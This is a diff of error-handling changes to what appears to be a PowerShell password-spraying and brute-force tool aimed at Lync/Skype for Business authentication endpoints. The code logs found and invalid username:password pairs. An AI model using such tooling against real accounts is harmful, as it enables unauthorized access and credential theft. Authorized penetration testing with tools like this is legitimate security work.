@@ -53,7 +53,7 @@ function Invoke-GetAutoDiscoverURL
     [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
     $domain = $Username.split("@")[1]
     $lyncurl = "https://lyncdiscover.$($domain)"
-    write-host "[*] Using autodiscover URL of $($lyncurl)"
+    write-verbose "[*] Using autodiscover URL of $($lyncurl)"
     $data = Invoke-WebRequest -Insecure -Uri $lyncurl -Method GET -ContentType "application/json" -UseBasicParsing
 
     if($data)
@@ -61,8 +61,7 @@ function Invoke-GetAutoDiscoverURL
       return $lyncurl;
     }
   }catch{
-    write-output "[*] Unable to get automatically retrieve autodiscover information, please specify"
-    exit 1
+    throw "Unable to get automatically retrieved autodiscover information, please specify"
   }
 }
 
@@ -162,9 +161,7 @@ function Invoke-LyncSpray
         $baseurl = (($data.content | ConvertFrom-JSON)._links.user.href).split("/")[0..2] -join "/"
       }
     }catch [Exception] {
-      echo $_.Exception.GetType().FullName, $_.Exception.Message
-      write-host "[*] Unable to retrieve or process AutoDiscover URL"
-      exit 1
+      throw "Unable to retrieve or process AutoDiscover URL: " + $_.Exception.GetType().FullName + " - " + $_.Exception.Message
     }
   }
 
@@ -288,9 +285,7 @@ function Invoke-LyncBrute
         $baseurl = (($data.content | ConvertFrom-JSON)._links.user.href).split("/")[0..2] -join "/"
       }
     }catch [Exception] {
-      echo $_.Exception.GetType().FullName, $_.Exception.Message
-      write-host "[*] Unable to retrieve or process AutoDiscover URL"
-      exit 1
+      throw "Unable to retrieve or process AutoDiscover URL: " + $_.Exception.GetType().FullName + " - " + $_.Exception.Message
     }
   }
 
@@ -397,8 +392,7 @@ function Invoke-Authenticate
     $data = Invoke-WebRequest -Uri "$baseurl/WebTicket/oauthtoken" -Method POST -Body $postParams -UseBasicParsing
     $authcwt = ($data.content | ConvertFrom-JSON).access_token
   }catch [Exception]{
-    echo $_.Exception.GetType().FullName, $_.Exception.Message
-    Write-Verbose "[*] Invalid credentials: $($Username):$($Password)"
+    Write-Verbose "[*] Invalid credentials: $($Username):$($Password)   (" + $_.Exception.GetType().FullName + " - " + $_.Exception.Message + ")"
     return
   }
   write-host -foreground "green" "[*] Found credentials: $($Username):$($Password)"
